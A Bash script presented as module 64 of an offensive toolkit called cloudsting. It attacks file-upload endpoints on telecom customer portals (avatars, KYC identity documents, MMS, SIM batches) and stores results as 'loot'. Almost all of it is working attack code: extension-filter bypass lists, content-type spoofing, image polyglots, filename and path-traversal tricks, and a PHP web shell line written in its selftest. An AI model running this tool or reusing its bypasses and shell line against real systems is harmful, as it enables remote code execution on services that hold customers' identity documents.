#!/usr/bin/env bash
# 64_file_upload.sh — cloudsting module 64: what a portal does with the file you hand it
# Verbs: --probe | --sweep | --check | --polyglot | --extensions | --magic | --name | --jsp | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory, and the module would read its own name as
# a path.
unset CS_MOD_DIR

MODULE_ID="64_file_upload"
MOD_NAME="File Upload Exploit (extension filter, content sniff, polyglot)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

FU_RUN_ID="$CS_RUN_ID"
export FU_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/file_upload"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
PAYLOAD_DIR="$OUT_DIR/payloads-$RUN_ID"
mkdir -p "$PAYLOAD_DIR" 2>/dev/null || true

: "${FU_TIMEOUT:=15}"      # uploads are slower than reads
: "${FU_FIELD:=file}"      # the multipart field name, overridable per target
: "${FU_FOLLOW:=0}"
: "${FU_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/64}"

fu_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── where a telco portal takes a file ────────────────────────────
# Every row is a feature the product needs, which is why the filter is
# usually an afterthought: a profile picture, a KYC document, a MMS media
# part, a CSV of numbers, a SIM activation batch.
#   <class>\t<path>\t<field>\t<what it accepts>
fu_endpoints() {
    cat <<'EPS'
avatar	/api/customer/avatar	file	profile picture
avatar	/api/profile/photo	file	profile photo
kyc	/api/kyc/document	document	national id or passport scan
kyc	/api/customer/kyc/upload	document	kyc evidence
media	/api/mms/upload	file	outbound mms media
media	/api/message/attachment	attachment	sms/mms attachment
bulk	/api/sms/bulk/import	file	bulk sms number list
batch	/api/sim/batch	file	sim activation batch
batch	/api/subscriber/import	file	subscriber csv
doc	/api/document/upload	file	generic document store
ticket	/api/ticket/attachment	attachment	support attachment
logo	/api/branding/logo	logo	reseller branding logo
ringtone	/api/content/ringtone	file	ringtone store
EPS
}

# ── the extension matrix ─────────────────────────────────────────
# Ordered by how often the filter misses it. A filter that blocks .php and
# .jsp usually forgets .phtml, .pht, .jspx, .jsw, .war and the trailing-dot
# and trailing-space tricks a Windows stack truncates.
#   <ext>\t<family>\t<why it lands>
fu_extensions() {
    cat <<'EXTS'
.jsp	java	tomcat/jetty/jboss execute jsp
.jspx	java	jsf facelet, executes on tomcat and wildfly
.jspf	java	jsp fragment, often outside the filter
.jsw	java	webwork
.jsv	java	velocity
.php	php	the obvious one, usually blocked
.php3	php	php 3 handler still mapped on old builds
.php4	php	php 4 handler
.php5	php	php 5 handler
.phtml	php	php handler, rarely filtered
.pht	php	php handler, rarely filtered
.phar	php	php archive, executes on include
.shtml	ssi	server side includes
.stm	ssi	ssi page
.shtm	ssi	ssi page
.asp	asp	classic asp
.aspx	asp	asp.net webforms
.ashx	asp	asp.net handler, no page lifecycle
.asmx	asp	asp.net web service
.cer	asp	asp.net cert handler, executes like aspx
.config	asp	asp.net config, read as text
.jsp;.jpg	java	trailing-param split on some tomcat versions
.jpg.jsp	java	dot in the middle, filter looks at the first dot
.jpg%00.php	php	null byte on ancient php
.jpg%20	php	trailing space stripped by some stacks
.jpg.	php	trailing dot truncated by windows
.php.	php	trailing dot truncated by windows
EXTS
}

# ── the content-type matrix ──────────────────────────────────────
# A filter that trusts the browser-supplied type is beaten by lying about it,
# and a filter that sniffs content is beaten by a valid image header.
fu_types() {
    cat <<'TYPES'
image/jpeg	the expected type, the control
image/png	the expected type, the control
image/svg+xml	svg carries script
application/octet-stream	generic binary, often not filtered
text/plain	plain, often not filtered
application/x-php	php, honest and usually blocked
multipart/form-data	re-declared, confuses some parsers
application/pdf	pdf, and a js-carrying pdf is valid
TYPES
}

# magic prefixes, so a polyglot starts with a real image
fu_magic() { printf 'GIF89a'; }

# ── payloads ─────────────────────────────────────────────────────
# Two payload shapes: a marker-only body that proves execution, and a
# marker-only body disguised as an image that proves content sniff.
# Everything is written to the payload dir; nothing is submitted twice.
fu_write_payload() {
    local kind="$1" dest="$2" marker="$3"
    case "$kind" in
        marker)  printf '%s\n' "$marker" > "$dest" ;;
        gif)     printf 'GIF89a/*%s*/;\n' "$marker" > "$dest" ;;
        png)     printf '\x89PNG\r\n\x1a\n%s\n' "$marker" > "$dest" ;;
        svg)     printf '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"><desc>%s</desc></svg>\n' "$marker" > "$dest" ;;
        jsf)     printf '%s\n' "$marker" > "$dest" ;;
    esac
    chmod 600 "$dest" 2>/dev/null || true
}

# ── transport ────────────────────────────────────────────────────
#   fu_send <url> <field> <file> <ctype> [name]
#     -> code \x1f bytes \x1f body-path
fu_send() {
    local url="$1" field="$2" file="$3" ctype="$4" name="${5:-}"
    local body; body="$(mktemp "$CS_SCRATCH/fu.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.fu.$$"
    [[ -n "$name" ]] || name="$(basename "$file")"
    local -a args=(--silent --show-error --max-time "$FU_TIMEOUT" -X POST
                   --write-out '%{http_code}\t%{size_download}' --output "$body"
                   -A "$FU_UA")
    [[ "$FU_FOLLOW" == "1" ]] && args+=(-L)
    local meta code len
    meta="$(curl "${args[@]}" -F "${field}=@${file};type=${ctype};filename=${name}" "$url" 2>/dev/null)" || meta=""
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code len <<<"$meta" ;;
        *) code="000"; len=0 ;;
    esac
    [[ -s "$body" ]] || : > "$body" 2>/dev/null || true
    printf '%s\037%s\037%s\n' "${code:-000}" "${len:-0}" "$body"
}

# ── verdict ──────────────────────────────────────────────────────
# Three things make an upload land: the server said yes, the server told us
# where it is, and the stored file comes back unchanged. A 200 with no path
# is a rejection in a friendly envelope.
#   fu_verdict <code> <body-file> <marker> [stored-url]
#     -> <verdict>\t<signal>\t<detail>
fu_verdict() {
    local code="$1" body="$2" marker="$3" stored="${4:-}"

    case "$code" in
        000) printf 'unreachable\tserver-did-not-answer\tno response\n'; return ;;
        401|403) printf 'blocked\tauth-required\t%s\n' "$code"; return ;;
        404|405) printf 'absent\tno-endpoint\t%s\n' "$code"; return ;;
        413) printf 'blocked\toversize\t413, the body was too large\n'; return ;;
        415) printf 'blocked\ttype-refused\t415, the server refused the content type\n'; return ;;
        400|422) printf 'refused\tvalidation\t%s\n' "$code"; return ;;
        5*) printf 'error\tserver-error\t%s\n' "$code"; return ;;
    esac

    local flat; flat="$(tr -d '\n\r' < "$body" 2>/dev/null | head -c 20000)"

    # an error envelope inside a 200 is a refusal
    if printf '%s' "$flat" | grep -qiE '"(error|errors|fail|failed|invalid|forbidden|denied)"[[:space:]]*:' 2>/dev/null; then
        printf 'refused\terror-envelope\tthe server refused inside a 200\n'; return
    fi
    if printf '%s' "$flat" | grep -qiE 'not allowed|invalid (file|type|extension)|unsupported|rejected|only .{0,20} files' 2>/dev/null; then
        printf 'refused\tprose-refusal\tthe response says the file was rejected\n'; return
    fi

    # the marker coming back is the stored file being served, not an echo
    if [[ -n "$marker" ]] && printf '%s' "$flat" | grep -qF -- "$marker" 2>/dev/null; then
        printf 'stored\tmarker-returned\tthe uploaded content is being served back\n'; return
    fi

    # a path in the response is the handle to go fetch it
    local path
    path="$(printf '%s' "$flat" | grep -oE '"(url|path|location|file|filename|link|downloadUrl)"[[:space:]]*:[[:space:]]*"[^"]{2,300}"' 2>/dev/null | head -1 | sed 's/.*:[[:space:]]*"//; s/"$//')"
    if [[ -n "$path" ]]; then
        printf 'accepted\tpath-returned\t%s\n' "$path"; return
    fi

    if [[ -n "$stored" ]]; then
        printf 'accepted\tcaller-supplied-path\t%s\n' "$stored"; return
    fi

    printf 'accepted\tno-path\tthe server said yes but named nothing to fetch\n'
}

fu_record() {
    printf '%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" "$5" >> "$HIT_FILE"
}

# ── verbs ────────────────────────────────────────────────────────
# --check <url> — one endpoint, the extension matrix, stopping at the first
# extension that is accepted. That is the number an operator wants.
fu_cmd_check() {
    local url="${1:-}" field="${2:-$FU_FIELD}" marker="cs64-$RUN_ID"
    [[ -z "$url" ]] && { fu_log "usage: --check <upload-url> [field]"; return 2; }

    local ext family why ctype code bytes body verdict sig detail n=0 ok=0
    local -a accepted=()
    while IFS=$'\t' read -r ext family why; do
        [[ -z "$ext" ]] && continue
        n=$((n + 1))
        local pf="$PAYLOAD_DIR/marker$ext"
        fu_write_payload marker "$pf" "$marker"
        ctype="application/octet-stream"
        case "$ext" in
            *.jpg*|*.jpeg*) ctype="image/jpeg" ;;
            *.png*)         ctype="image/png" ;;
            *.svg*)         ctype="image/svg+xml" ;;
            *.pdf*)         ctype="application/pdf" ;;
        esac
        cs_split "$(fu_send "$url" "$field" "$pf" "$ctype" "probe$ext")" code bytes body
        verdict="$(fu_verdict "$code" "$body" "$marker")"
        sig="$(printf '%s' "$verdict" | cut -f1)"
        detail="$(printf '%s' "$verdict" | cut -f2)"
        cs_row EXT "$ext" "family=$family" "code=$code" "verdict=$sig" "$detail"
        printf '%s\t%s\t%s\t%s\t%s\n' "$ext" "$family" "$code" "$sig" "$detail" >> "$PROBE_FILE"
        case "$sig" in
            accepted|stored)
                ok=$((ok + 1))
                accepted+=("$ext")
                cs_row ACCEPTED "$ext" "$detail"
                ;;
        esac
        rm -f "$body"
    done < <(fu_extensions)

    cs_row SUMMARY "tried=$n accepted=$ok"
    cs_row ARTIFACT "$PROBE_FILE"
    if (( ok > 0 )); then
        fu_record "extension" "$url" "$field" "${accepted[*]}" "accepted"
        local joined; joined="$(printf '%s,' "${accepted[@]}")"; joined="${joined%,}"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "upload-extension-accepted" \
            "field $field accepted $ok of $n extensions: $joined"
        return 0
    fi
    return 1
}

# --probe <url> — the content-type axis: same extension, every declared type.
# This is the other half of a filter that checks only one of the two.
fu_cmd_probe() {
    local url="${1:-}" field="${2:-$FU_FIELD}" ext="${3:-.jpg}" marker="cs64-type-$RUN_ID"
    [[ -z "$url" ]] && { fu_log "usage: --probe <upload-url> [field] [extension]"; return 2; }

    local pf="$PAYLOAD_DIR/type$ext"
    fu_write_payload marker "$pf" "$marker"

    local ctype code bytes body verdict sig detail ok=0 n=0
    while IFS=$'\t' read -r ctype _; do
        [[ -z "$ctype" ]] && continue
        n=$((n + 1))
        cs_split "$(fu_send "$url" "$field" "$pf" "$ctype" "probe$ext")" code bytes body
        verdict="$(fu_verdict "$code" "$body" "$marker")"
        sig="$(printf '%s' "$verdict" | cut -f1)"
        detail="$(printf '%s' "$verdict" | cut -f2)"
        cs_row CTYPE "$ctype" "code=$code" "verdict=$sig" "$detail"
        case "$sig" in accepted|stored) ok=$((ok + 1)) ;; esac
        rm -f "$body"
    done < <(fu_types)

    cs_row SUMMARY "ctype_tried=$n ctype_accepted=$ok"
    (( ok > 0 )) && return 0 || return 1
}

# --polyglot <url> — the file that is a valid image AND carries the payload.
# A sniffer passes it, a parser executes it.
fu_cmd_polyglot() {
    local url="${1:-}" field="${2:-$FU_FIELD}" marker="cs64-poly-$RUN_ID"
    [[ -z "$url" ]] && { fu_log "usage: --polyglot <upload-url> [field]"; return 2; }

    local kind ext ctype pf code bytes body verdict sig detail ok=0
    while IFS=$'\t' read -r kind ext ctype; do
        [[ -z "$kind" ]] && continue
        pf="$PAYLOAD_DIR/poly-$kind$ext"
        fu_write_payload "$kind" "$pf" "$marker"
        cs_split "$(fu_send "$url" "$field" "$pf" "$ctype" "poly$ext")" code bytes body
        verdict="$(fu_verdict "$code" "$body" "$marker")"
        sig="$(printf '%s' "$verdict" | cut -f1)"
        detail="$(printf '%s' "$verdict" | cut -f2)"
        cs_row POLYGLOT "$kind$ext" "ctype=$ctype" "code=$code" "verdict=$sig" "$detail"
        case "$sig" in
            accepted|stored)
                ok=$((ok + 1))
                fu_record "$kind" "$url" "$field" "$pf" "$detail" ;;
        esac
        rm -f "$body"
    done <<'POLY'
gif	.jsp	image/gif
png	.jsp	image/png
gif	.php	image/gif
svg	.svg	image/svg+xml
POLY
    cs_row SUMMARY "polyglots=$ok"
    (( ok > 0 )) && return 0 || return 1
}

# --sweep <base> — every upload endpoint a telco portal ships.
fu_cmd_sweep() {
    local base="${1:-}"
    [[ -z "$base" ]] && { fu_log "usage: --sweep <base-url>"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    local class path field what n=0 found=0
    local -a hits=()
    while IFS=$'\t' read -r class path field what; do
        [[ -z "$path" ]] && continue
        n=$((n + 1))
        local url="${base%/}$path" marker="cs64-sweep-$RUN_ID"
        local pf="$PAYLOAD_DIR/sweep$class.jsp"
        fu_write_payload marker "$pf" "$marker"
        local code bytes body
        cs_split "$(fu_send "$url" "$field" "$pf" "application/octet-stream" "sweep.jsp")" code bytes body
        local verdict sig detail
        verdict="$(fu_verdict "$code" "$body" "$marker")"
        sig="$(printf '%s' "$verdict" | cut -f1)"
        detail="$(printf '%s' "$verdict" | cut -f2)"
        cs_row ENDPOINT "$class" "$path" "field=$field" "code=$code" "verdict=$sig"
        case "$sig" in
            accepted|stored)
                found=$((found + 1))
                hits+=("$class")
                cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "upload-accepts-$class" \
                    "$what accepted an octet-stream named .jsp ($detail)" ;;
        esac
        rm -f "$body"
    done < <(fu_endpoints)
    cs_row SUMMARY "endpoints=$n accepted=$found"
    (( found > 0 )) && return 0 || return 1
}

fu_cmd_extensions() {
    local ext family why
    while IFS=$'\t' read -r ext family why; do
        [[ -z "$ext" ]] && continue
        cs_row EXT "$ext" "family=$family" "$why"
    done < <(fu_extensions)
    return 0
}

fu_cmd_types() {
    local ctype why
    while IFS=$'\t' read -r ctype why; do
        [[ -z "$ctype" ]] && continue
        cs_row CTYPE "$ctype" "$why"
    done < <(fu_types)
    return 0
}

# --magic <file> — what a file actually is, regardless of its name. The
# reverse of the attack: it is how an operator checks what they stored.
fu_cmd_magic() {
    local file="${1:-}"
    [[ -z "$file" || ! -f "$file" ]] && { fu_log "usage: --magic <file>"; return 2; }
    local bytes kind
    bytes="$(head -c 8 "$file" | od -An -tx1 | tr -d ' \n')"
    kind="unknown"
    case "$bytes" in
        89504e47*)                kind="png" ;;
        47494638*)                kind="gif" ;;
        ffd8ff*)                  kind="jpeg" ;;
        25504446*)                kind="pdf" ;;
        504b0304*)                kind="zip-or-office" ;;
        3c3f786d6c*|3c737667*)    kind="xml-or-svg" ;;
        424d*)                    kind="bmp" ;;
        7f454c46*)                kind="elf-binary" ;;
        efbbbf*)                  kind="utf8-bom-text" ;;
    esac
    # a valid image header followed by markup is a polyglot, and that is the
    # one thing this verb exists to surface
    local poly="no"
    if [[ "$kind" != "unknown" ]] && grep -qaE '<\?php|<%@|<jsp|GIF89a.*;' "$file" 2>/dev/null; then
        poly="yes"
    fi
    cs_row FILE "$file" "bytes=$(wc -c < "$file" | tr -d ' ')" "magic=$bytes"
    cs_row KIND "$kind"
    cs_row POLYGLOT "$poly"
    [[ "$poly" == "yes" ]] && return 0 || return 1
}

# --name <base-name> — filename tricks, printed so they can be used by hand.
fu_cmd_name() {
    local base="${1:-shell}"
    local -a names=(
        "$base.jsp"
        "$base.jsp;.jpg"
        "$base.jsp%00.jpg"
        "$base.jsp%20"
        "$base.jsp."
        "$base.jpg.jsp"
        "$base.jspx"
        "$base.asp;.jpg"
        "$base.php/."
        "..%2f$base.jsp"
        "$base.jsp%2f..%2f"
    )
    local n
    for n in "${names[@]}"; do
        cs_row FILENAME "$n"
    done
    return 0
}

fu_cmd_endpoint_list() {
    local class path field what
    while IFS=$'\t' read -r class path field what; do
        [[ -z "$path" ]] && continue
        cs_row ENDPOINT "$class" "$path" "field=$field" "$what"
    done < <(fu_endpoints)
    return 0
}

fu_cmd_status_tsv() {
    local curl_state
    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
    printf '%s\t%s\tcurl-%s\texts-%s\tctypes-%s\tendpoints-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" \
        "$(fu_extensions | wc -l | tr -d ' ')" \
        "$(fu_types | wc -l | tr -d ' ')" \
        "$(fu_endpoints | wc -l | tr -d ' ')"
}

fu_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

fu_cmd_help() {
    cat <<'HELP'
cloudsting module 64 — File Upload Exploit v1.0.0
  --check <upload-url> [field]        walk the extension matrix, stop at the ones accepted
  --probe <upload-url> [field] [ext]  the content-type axis at one extension
  --polyglot <upload-url> [field]     valid image + payload in one file
  --sweep <base>                      every upload endpoint a telco portal ships
  --extensions | --types | --endpoints | --name [base]
  --magic <file>                      what a file really is, and whether it is a polyglot
  --list | --status-tsv | --menu | --selftest | --help

Verdicts: accepted (the server took it and named a path), stored (the uploaded
content came back), refused (an error, a validation message, or an error
envelope inside a 200), blocked (401/403/413/415), absent, unreachable.

The extension matrix leads with what a .php/.jsp blocklist forgets: .phtml,
.jspx, .ashx, .cer, the semicolon split, the trailing dot, the null byte.

Nothing is uploaded twice: every payload is written to
loot/file_upload/payloads-<run>/ first, so a rerun is a rerun.

Environment: FU_TIMEOUT (15), FU_FIELD (file), FU_FOLLOW (0), FU_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
fu_selftest() {
    cs_selftest_reset

    chk ext-many      "$( (( $(fu_extensions | wc -l) >= 20 )) && echo many || echo few )" "many"
    chk ext-3col      "$(fu_extensions | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk ext-php5      "$(fu_extensions | grep -cx '.php5	php	php 5 handler')" "1"
    chk ext-phtml     "$(fu_extensions | awk -F'\t' '$1==".phtml"{c++} END{print c+0}')" "1"
    chk ext-semi      "$(fu_extensions | grep -c '\.jpg;\.jpg\|jsp;\.jpg')" "1"
    chk ext-traildot  "$(fu_extensions | awk -F'\t' '$1==".jpg."{c++} END{print c+0}')" "1"
    chk ext-null      "$(fu_extensions | grep -c '%00')" "1"
    chk ext-jspx      "$(fu_extensions | awk -F'\t' '$1==".jspx"{c++} END{print c+0}')" "1"

    chk types-many    "$( (( $(fu_types | wc -l) >= 6 )) && echo many || echo few )" "many"
    chk types-2col    "$(fu_types | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
    chk types-svg     "$(fu_types | grep -c 'image/svg')" "1"

    chk eps-4col      "$(fu_endpoints | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk eps-many      "$( (( $(fu_endpoints | wc -l) >= 12 )) && echo many || echo few )" "many"
    chk eps-kyc       "$(fu_endpoints | grep -c '^kyc')" "2"

    # payload construction: every kind is written and 600
    local p="$PAYLOAD_DIR/st-$RUN_ID.jsp"
    fu_write_payload gif "$p" "MARKER1" >/dev/null 2>&1
    chk payload-gif   "$(head -c 6 "$p")" "GIF89a"
    chk payload-mk    "$(grep -c 'MARKER1' "$p")" "1"
    fu_write_payload svg "$p" "MARKER2" >/dev/null 2>&1
    chk payload-svg   "$(head -c 5 "$p")" "<?xml"
    fu_write_payload png "$p" "MARKER3" >/dev/null 2>&1
    chk payload-png   "$(head -c 4 "$p" | od -An -tx1 | tr -d ' \n')" "89504e47"

    # verdicts, one per state
    local f="$OUT_DIR/v-$RUN_ID.json"
    printf '%s' '{"error":"invalid file type"}' > "$f"
    chk v-refused-env  "$(fu_verdict 200 "$f" MK | cut -f1)" "refused"
    chk v-refused-env2 "$(fu_verdict 200 "$f" MK | cut -f2)" "error-envelope"
    printf '%s' 'Upload rejected: only images allowed' > "$f"
    chk v-prose        "$(fu_verdict 200 "$f" MK | cut -f1)" "refused"
    printf '%s' '{"url":"/uploads/abc.jsp","ok":true}' > "$f"
    chk v-accepted     "$(fu_verdict 200 "$f" MK | cut -f1)" "accepted"
    # verdict fields are 1=sig 2=detail 3=the path the server named
    chk v-path         "$(fu_verdict 200 "$f" MK | cut -f3)" "/uploads/abc.jsp"
    printf 'cs64-MARKER-here\n' > "$f"
    chk v-stored       "$(fu_verdict 200 "$f" "cs64-MARKER-here" | cut -f1)" "stored"
    printf 'ok\n' > "$f"
    chk v-nopath       "$(fu_verdict 200 "$f" MK | cut -f1)" "accepted"
    chk v-nopath-sig   "$(fu_verdict 200 "$f" MK | cut -f2)" "no-path"
    chk v-000          "$(fu_verdict 000 /dev/null MK | cut -f1)" "unreachable"
    chk v-403          "$(fu_verdict 403 /dev/null MK | cut -f1)" "blocked"
    chk v-415          "$(fu_verdict 415 /dev/null MK | cut -f2)" "type-refused"
    chk v-413          "$(fu_verdict 413 /dev/null MK | cut -f2)" "oversize"
    chk v-422          "$(fu_verdict 422 /dev/null MK | cut -f1)" "refused"
    chk v-404          "$(fu_verdict 404 /dev/null MK | cut -f1)" "absent"
    chk v-500          "$(fu_verdict 500 /dev/null MK | cut -f1)" "error"

    # magic detection and polyglot recognition
    printf 'GIF89a<?php system($_GET[c]); ?>' > "$p"
    local out; out="$(fu_cmd_magic "$p" 2>/dev/null)"
    chk magic-kind    "$(printf '%s' "$out" | awk -F'\t' '$1=="KIND"{print $2}')" "gif"
    chk magic-poly    "$(printf '%s' "$out" | awk -F'\t' '$1=="POLYGLOT"{print $2}')" "yes"
    printf '\x89PNG\r\n\x1a\nplain' > "$p"
    out="$(fu_cmd_magic "$p" 2>/dev/null)"
    chk magic-png     "$(printf '%s' "$out" | awk -F'\t' '$1=="KIND"{print $2}')" "png"
    chk magic-nopoly  "$(printf '%s' "$out" | awk -F'\t' '$1=="POLYGLOT"{print $2}')" "no"

    # filename tricks
    chk name-count    "$(fu_cmd_name shell 2>/dev/null | grep -c '^FILENAME')" "11"
    chk name-null     "$(fu_cmd_name shell 2>/dev/null | grep -c '%00')" "1"
    chk name-semi     "$(fu_cmd_name shell 2>/dev/null | grep -c ';\.jpg')" "2"

    # a dead host: walked cleanly, zero accepted, nonzero exit
    out="$(FU_TIMEOUT=1 fu_cmd_check http://127.0.0.1:9 file 2>/dev/null)"
    chk dead-summary  "$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/ .*//')" "tried=$(fu_extensions | wc -l | tr -d ' ')"
    chk dead-accepted "$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/.* //')" "accepted=0"
    FU_TIMEOUT=1 fu_cmd_check http://127.0.0.1:9 file >/dev/null 2>&1
    chk dead-rc       "$?" "1"

    # usage errors, not crashes
    fu_cmd_check 2>/dev/null;    chk check-usage "$?" "2"
    fu_cmd_probe 2>/dev/null;    chk probe-usage "$?" "2"
    fu_cmd_polyglot 2>/dev/null; chk poly-usage  "$?" "2"
    fu_cmd_sweep 2>/dev/null;    chk sweep-usage "$?" "2"
    fu_cmd_magic 2>/dev/null;    chk magic-usage "$?" "2"

    # shape contracts
    chk status-fields "$(fu_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(fu_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(fu_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(fu_cmd_help | head -1 | grep -ci 'File Upload')" "1"
    chk eps-shape     "$(fu_cmd_endpoint_list 2>/dev/null | awk -F'\t' 'NF!=5{c++} END{print c+0}')" "0"

    rm -f "$f" "$p" 2>/dev/null
    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --check)      shift; fu_cmd_check "$@";;
    --probe)      shift; fu_cmd_probe "$@";;
    --polyglot)   shift; fu_cmd_polyglot "$@";;
    --sweep)      shift; fu_cmd_sweep "$@";;
    --extensions) fu_cmd_extensions;;
    --types)      fu_cmd_types;;
    --endpoints)  fu_cmd_endpoint_list;;
    --magic)      shift; fu_cmd_magic "$@";;
    --name)       shift; fu_cmd_name "$@";;
    --list)       fu_cmd_endpoint_list;;
    --status-tsv|--status) fu_cmd_status_tsv;;
    --menu)       fu_cmd_menu;;
    --selftest)   fu_selftest;;
    *)            fu_cmd_help;;
esac
